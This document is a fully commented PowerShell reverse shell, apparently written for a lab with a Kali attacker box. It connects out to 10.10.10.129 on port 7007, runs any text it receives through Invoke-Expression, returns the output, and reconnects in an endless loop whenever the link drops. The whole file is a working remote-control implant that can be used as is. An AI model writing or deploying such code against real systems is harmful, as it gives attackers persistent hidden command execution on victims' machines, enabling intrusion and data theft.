# Keep the agent running continuously.
# If the connection fails or closes, it will try to reconnect.
while ($true) {

    try {

        # ---------------------------------------------------------
        # Connection settings
        # ---------------------------------------------------------

        # Remote machine IP address (Kali)
        $server = "10.10.10.129"

        # TCP port used for communication
        $port = 7007


        # ---------------------------------------------------------
        # Establish TCP connection
        # ---------------------------------------------------------

        # Create a TCP client.
        # Windows initiates an outbound connection to Kali.
        $client = [System.Net.Sockets.TcpClient]::new($server, $port)

        # Get the network stream associated with the TCP connection.
        $stream = $client.GetStream()


        # ---------------------------------------------------------
        # Create reader and writer
        # ---------------------------------------------------------

        # Used to receive text from the remote machine.
        $reader = New-Object System.IO.StreamReader($stream)

        # Used to send text back to the remote machine.
        $writer = New-Object System.IO.StreamWriter($stream)

        # Send data immediately instead of keeping it in a buffer.
        $writer.AutoFlush = $true


        # Notify the remote machine that Windows connected.
        $writer.WriteLine("Windows lab agent connected.")


        # ---------------------------------------------------------
        # Command-processing loop
        # ---------------------------------------------------------

        # Label the loop so that the "exit" command can leave
        # this specific loop cleanly.
        :CommandLoop while ($client.Connected) {

            # Show the current Windows directory in the Kali terminal.
            $writer.Write("PS $((Get-Location).Path)> ")

            # Wait for one line of text from the remote machine.
            $command = $reader.ReadLine()


            # If ReadLine() returns $null, the remote side
            # has closed the connection.
            if ($null -eq $command) {
                break CommandLoop
            }


            # Clear the previous result so an old value
            # cannot accidentally be sent again.
            $result = $null


            # Remove spaces around the command and convert
            # it to lowercase before checking it.
            #
            # Example:
            # " HOSTNAME " -> "hostname"
            switch ($command.Trim().ToLower()) {


                # Return the Windows computer name.
                "hostname" {
                    $result = hostname
                }


                # Return the user/account running the script.
                "whoami" {
                    $result = whoami
                }


                # Return the current Windows date and time.
                "date" {
                    $result = Get-Date
                }


                # Return the Windows network configuration.
                "ip" {
                    $result = ipconfig | Out-String
                }


                # Close the current command session.
                "exit" {
                    $writer.WriteLine("Closing connection.")
                    break CommandLoop
                }


                # Execute other input as a PowerShell command.
                default {
                    try {
                        # Capture normal output and error messages.
                        $result = Invoke-Expression -Command $command 2>&1 |
                            Out-String
                    }
                    catch {
                        # Return the error without ending the agent.
                        $result = $_.Exception.Message
                    }
                }
            }


            # Convert the command result to text
            # and send it back to the remote machine.
            $writer.WriteLine(($result | Out-String))


            # Marker indicating that the response has finished.
            $writer.WriteLine("---END---")
        }


        # ---------------------------------------------------------
        # Clean up the connection
        # ---------------------------------------------------------

        # Close the reader.
        $reader.Close()

        # Close the writer.
        $writer.Close()

        # Close the network stream.
        $stream.Close()

        # Close the TCP client.
        $client.Close()


    }
    catch {

        # If the connection fails or drops,
        # wait 5 seconds before trying again.
        Start-Sleep -Seconds 5
    }
}